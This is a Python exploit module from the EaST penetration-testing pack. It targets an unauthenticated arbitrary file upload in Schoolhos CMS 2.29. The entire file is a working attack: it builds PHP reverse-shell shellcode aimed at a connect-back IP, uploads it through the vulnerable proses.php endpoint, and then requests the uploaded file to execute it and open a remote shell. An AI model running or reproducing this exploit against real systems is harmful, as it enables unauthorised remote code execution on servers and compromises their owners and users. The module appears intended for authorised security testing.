#!/usr/bin/env python
# The exploit is a part of EaST pack - use only under the license agreement
# specified in LICENSE.txt in your EaST distribution

from collections import OrderedDict
import urlparse
import urllib
import urllib2
from core.WebHelper import FormPoster
from shellcodes.Shellcodes import CrossOSShellcodes

from Sploit import Sploit

INFO = {}
INFO['NAME'] = "schoolhoscms_afu"
INFO['DESCRIPTION'] = "Schoolhos CMS 2.29 Arbitrary File Upload"
INFO['VENDOR'] = "https://sourceforge.net/projects/schoolhoscms/"
INFO["CVE Name"] = ""
INFO["NOTES"] = """
    An unathenticated attacker can upload arbitrary file to "/file/materi/" dir.
Sockets must be enabled in php.ini on vulnerable machine for executing shellcode.
Tested against Schoolhos CMS 2.29 on Windows 7 SP1 x64.
    """
INFO["DOWNLOAD_LINK"] = "https://sourceforge.net/projects/schoolhoscms/"
INFO["LINKS"] = ['https://www.exploit-db.com/exploits/40753/']
INFO['CHANGELOG'] = "13 Nov, 2016. Written by Gleg team."
INFO['PATH'] = "Web/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.176"
OPTIONS["PORT"] = 81
OPTIONS["SSL"] = False
OPTIONS["BASEPATH"] = "/schoolhoscms"
OPTIONS["CONNECTBACK_IP"] = "192.168.1.110"



class exploit(Sploit):
    def __init__(self, host='', port=80, logger=None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', OPTIONS["HOST"])
        self.port = self.args.get('PORT', OPTIONS["PORT"])
        self.path = self.args.get('BASEPATH', OPTIONS["BASEPATH"])
        self.ssl = self.args.get('SSL', OPTIONS['SSL'])
        self.connectback_ip = self.args.get('CONNECTBACK_IP', OPTIONS['CONNECTBACK_IP'])
        if self.args['listener']:
            self.listener_port = self.args['listener']['PORT']
        else:
            self.log("[!] Please enable listener to recieve connection from remote shell")
            self.finish(False)
        proto = "https" if self.ssl else "http"
        self.url = urlparse.urljoin("{}://{}:{}/".format(proto, self.host, self.port), self.path)

    def create_shell(self):
        s = CrossOSShellcodes(self.connectback_ip, self.listener_port)
        shell = s.create_shellcode('php', True)
        return shell

    def run(self):
        self.args()
        form = FormPoster()
        filename = self.random_string() + ".php"
        form.add_file('fupload', filename, self.create_shell(), False, "application/x-httpd-php")
        req = form.post(self.url + "/elearningku/proses.php?pilih=guru&untukdi=upload")
        self.log("[*] Trying to upload " + filename)
        res = urllib2.urlopen(req)
        self.log("[*] Trying to execute payload")
        urllib2.urlopen(self.url + "/file/materi/"+filename).read()
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()